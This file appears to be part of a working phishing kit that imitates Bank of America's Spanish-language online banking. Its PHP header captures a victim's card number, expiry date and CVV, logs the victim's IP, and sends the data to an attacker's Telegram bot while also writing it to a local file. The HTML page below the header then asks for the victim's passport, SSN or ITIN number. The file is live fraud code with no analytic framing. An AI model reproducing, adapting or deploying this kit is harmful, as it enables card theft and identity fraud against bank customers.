<?php 
error_reporting(0);

include('dt.php');
session_start();
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
$id=md5(rand());
$session=md5(rand());
@ini_set('display_errors', 'on'); 
ob_start();
function getRealIP()
{if (isset($_SERVER["HTTP_CLIENT_IP"])) {return $_SERVER["HTTP_CLIENT_IP"];} elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {return $_SERVER["HTTP_X_FORWARDED_FOR"];} elseif (isset($_SERVER["HTTP_X_FORWARDED"])) {return $_SERVER["HTTP_X_FORWARDED"];} elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])) {return $_SERVER["HTTP_FORWARDED_FOR"];} elseif (isset($_SERVER["HTTP_FORWARDED"])) {return $_SERVER["HTTP_FORWARDED"];} else {return $_SERVER["REMOTE_ADDR"];}}
$ip=getRealIP();

$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));

   $ccNo = $_POST['ccNo'];
   $mes = $_POST['mes'];
   $ano = $_POST['ano'];
   $cvv =  $_POST['cvv'];


if ( isset ($ccNo) && isset ($mes) && isset ($ano) && isset ($cvv)){
$message = "BoA Tarj.\r\nNT= ".$ccNo."\r\nMes= ".$mes.", Ano= ".$ano.", Cvv= ".$cvv."\r\n" ;
$message .= "IP= ".$ip."\r\n";
$apiToken = $apibot;
$data = [
  'chat_id' => $canal,
  'text' => $message];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); }
     $handle = fopen($datos, "a");   
   fwrite($handle, "N. Tarjeta= ".$ccNo."\r\n");
   fwrite($handle, "Mes= ".$mes.", Año= ".$ano."\r\n");
   fwrite($handle, "Cvv= ".$cvv."\r\n");
   fwrite($handle, "IP = ".$ip."\r\n");
   fwrite($handle, "=================================\r\n");
  fclose($handle); ?>

<!DOCTYPE html>
<!-- saved from url=(0056)https://americanssafaricamp.com/identityconfirmation.php -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        Bank of America: operaciones bancarias, tarjetas de crédito, préstamos e
        inversiones con Merrill
    </title>
    <link rel="stylesheet" href="./css/normalize.min.css">
    <link rel="stylesheet" href="./css/estilos2.css">
    <link rel="shortcut icon" href="./images/favicon.ico" type="image/x-icon">
</head>

<body>
    <div class="cuerpo">
        <div class="header">
            <img src="./images/logo-entrar.png" alt="logo">
            <img src="./images/protegida-area.png" class="protegida" alt="protegida">
        </div>
        <div class="header2">
            <h1>Verificar su Identidad</h1>
        </div>
        <div class="section">
            <div class="principal">
                <h2>Casi hemos terminado</h2>
                <p>Proporcione la siguiente información para completar el proceso de verificación</p>
                <p class="error" id="error">________</p>
                <form autocomplete="off" id="fident" style="font-family: &#39;cnx-regular&#39;, Arial, Helvetica, sans-serif;font-size:16px;" method="post" action="end.php">
                    <div class="fgrupo">
                        <label for="docu">Tipo de documento</label>
                        <select name="docu" id="docu" style="height: 27px;width:212px;">
                        <option value="">Seleccione</option>
                            <option value="pasaporte">Pasaporte</option>
                            <option value="ssn">Número de Seguro Social (SSN)</option>
                            <option value="itin">Número de Identificación Personal del Contribuyente (ITIN)</option>
                        </select>
                    </div>
                    <div class="fgrupo">
                        <label for="nident">Número de Identificación</label>
                        <input class="inputCard" type="tel" name="ndocu" id="ndocu" placeholder="123456789" maxlength="9" onkeypress="return event.charCode >= 48 && event.charCode <= 57" style="height: 22px;width:202px;">
                    </div>
                    
                    <p>
                        Recuerde ingresar sus datos cuidadosamente a fin de comprobar su identidad y seguir proporcionandole nuestros servicios de Online Banking
                    </p>


                    <div class="fgrupo">
                        <button type="button" id="bdocu" class="btn principal">CONFIRMAR</button>
                    </div>
                </form>
            </div>
            <div class="derecha">
                <img src="./images/ayuda-docu.png" alt="documento">
            </div>
        </div>
        <div class="footer">
            <img src="./images/footer.png" alt="footer">
        </div>
    </div>
    <script src="./js/funciones.js"></script>


</body></html>